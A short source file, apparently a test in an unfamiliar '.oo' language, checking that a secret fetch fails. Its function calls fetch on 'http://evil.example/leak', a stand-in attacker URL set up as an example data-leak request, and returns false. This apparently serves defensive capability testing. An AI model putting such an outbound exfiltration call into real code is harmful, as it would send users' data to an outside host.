// # Secret Fetch Fail
//
// Logline: Standard library verification and domain capabilities for Secret Fetch Fail.
//
// Setup: Pure .oo standard library module.
//
// Beats:
//   1. Execute domain operations.
//   2. Verify invariants and return typed results.

pub fn verify_secret_fetch_fail(net: &HttpCap) -> Bool {
    let token = "http://evil.example/leak";
    let r = fetch(net, token);
    println(1);
    return false;
}
